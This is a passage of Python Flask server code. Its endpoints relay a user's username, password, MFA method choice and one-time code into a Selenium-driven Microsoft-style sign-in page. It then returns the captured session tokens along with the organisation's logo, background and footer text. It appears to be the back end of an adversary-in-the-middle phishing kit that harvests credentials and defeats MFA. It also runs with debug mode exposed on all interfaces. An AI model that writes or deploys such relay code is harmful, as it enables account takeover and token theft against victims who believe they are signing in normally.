    return jsonify({"ok": True, "username": username, "status": "started"})


@app.route("/login/org-signin", methods=["POST"])
def login_org_signin():
    """
    Best-effort autofill for a federated third-party IdP page. See the
    module-level "FEDERATED/ORG ACCOUNT CAVEAT" docstring above.
    """
    data = request.get_json(force=True) or {}
    username = data.get("username", "").strip()
    email = data.get("email", "").strip()
    password = data.get("password", "")

    with _sessions_lock:
        session = _sessions.get(username)
    if not session:
        return jsonify({"ok": False, "output": "No session for this username."}), 404

    driver = session.selauth.driver

    try:
        email_field = driver.find_element(By.CSS_SELECTOR, 'input[type="email"], input[type="text"]')
        if email:
            email_field.clear()
            email_field.send_keys(email)

        password_field = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
        password_field.send_keys(password)

        try:
            submit_btn = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
            _click_robust(driver, submit_btn)
        except NoSuchElementException:
            password_field.send_keys(Keys.ENTER)

    except NoSuchElementException:
        return jsonify({"ok": False, "output": "Could not find email/password fields on this IdP's page — its markup isn't recognized yet."}), 404

    with session.lock:
        session.stage = Stage.ENTERING_PASSWORD  # hand off to the shared post-credentials flow

    threading.Thread(target=_run_org_login_job, args=(username,), daemon=True).start()
    return jsonify({"ok": True, "username": username, "status": "started"})


@app.route("/login/status/<username>", methods=["GET"])
def login_status(username):
    with _sessions_lock:
        session = _sessions.get(username)
    if not session:
        return jsonify({"ok": False, "output": "No session for this username."}), 404

    with session.lock:
        payload = {
            "ok": session.stage != Stage.FAILED,
            "stage": session.stage,
            "mfa_options": session.mfa_options,
            "federated_domain": session.federated_domain,
            "error": session.error,
            "tokens": session.tokens,
            "background_image": session.background_image,
            "logo": session.logo,
            "footer_text": session.footer_text,
        }

    if session.stage in (Stage.SUCCEEDED, Stage.FAILED):
        with _sessions_lock:
            _sessions.pop(username, None)

    return jsonify(payload)


@app.route("/login/cancel", methods=["POST"])
def login_cancel():
    data = request.get_json(force=True) or {}
    username = data.get("username", "").strip()
    if not username:
        return jsonify({"ok": False, "output": "username is required."}), 400

    with _sessions_lock:
        session = _sessions.pop(username, None)

    if session is not None and session.selauth is not None:
        threading.Thread(target=_quit_driver_safely, args=(session.selauth.driver,), daemon=True).start()

    return jsonify({"ok": True})


@app.route("/login/mfa-select", methods=["POST"])
def login_mfa_select():
    data = request.get_json(force=True) or {}
    username = data.get("username", "").strip()
    option = data.get("option", "").strip()

    with _sessions_lock:
        session = _sessions.get(username)
    if not session:
        return jsonify({"ok": False, "output": "No session for this username."}), 404
    if not option:
        return jsonify({"ok": False, "output": "option is required."}), 400

    driver = session.selauth.driver

    if "can't use my Microsoft Authenticator" in option:
        el = _find_by_text(driver, _SWITCH_METHOD_LINK_TEXT)
        if el is None:
            return jsonify({"ok": False, "output": "Switch-method link not found on current screen."}), 404
        _click_robust(driver, el)
        return jsonify({"ok": True})

    switch_link = _find_by_text(driver, _SWITCH_METHOD_LINK_TEXT)
    if switch_link is not None and _find_by_text(driver, "Approve sign in request") is not None:
        _click_robust(driver, switch_link)
        time.sleep(1)

    el = _find_by_text(driver, option)
    if el is None:
        return jsonify({"ok": False, "output": f"Option '{option}' not found on current screen."}), 404

    _click_robust(driver, el)
    return jsonify({"ok": True})


@app.route("/login/mfa-code", methods=["POST"])
def login_mfa_code():
    data = request.get_json(force=True) or {}
    username = data.get("username", "").strip()
    code = data.get("code", "").strip()

    with _sessions_lock:
        session = _sessions.get(username)
    if not session:
        return jsonify({"ok": False, "output": "No session for this username."}), 404
    if not code:
        return jsonify({"ok": False, "output": "code is required."}), 400

    driver = session.selauth.driver

    try:
        field = driver.find_element(By.ID, "idTxtBx_SAOTCC_OTC")
        field.send_keys(code)
        submit = driver.find_element(By.ID, "idSubmit_SAOTCC_Continue")
        _click_robust(driver, submit)
        return jsonify({"ok": True})
    except NoSuchElementException:
        return jsonify({"ok": False, "output": "Code entry field not found on current screen."}), 404


if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 5050)), debug=True, use_reloader=True, allow_unsafe_werkzeug=True)